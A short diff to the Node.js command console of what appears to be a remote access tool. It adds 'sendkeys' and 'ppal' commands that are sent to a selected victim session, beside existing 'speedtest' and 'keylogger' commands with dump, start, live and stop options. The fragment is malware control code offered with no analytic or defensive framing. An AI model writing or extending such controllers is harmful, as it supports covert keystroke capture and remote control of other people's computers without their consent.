@@ -160,6 +160,10 @@ rl.on('line', (line) => {
 		} else if (msg == "speedtest") {
 			console.log("[".bold + "+".blue + "] Speed testing...".bold);
 			sessions[currentSession].send(msg);
+		} else if (msg.startsWith("sendkeys")) {
+			sessions[currentSession].send(msg);
+		} else if (msg.startsWith("ppal")) {
+			sessions[currentSession].send("ppal");
 		} else if (msg.startsWith("keylogger")) {
 			if(msg.split(" ").length == 2){
 				if(msg.split(" ")[1] == "dump" || msg.split(" ")[1] == "start" || msg.split(" ")[1] == "live" || msg.split(" ")[1] == "stop"){
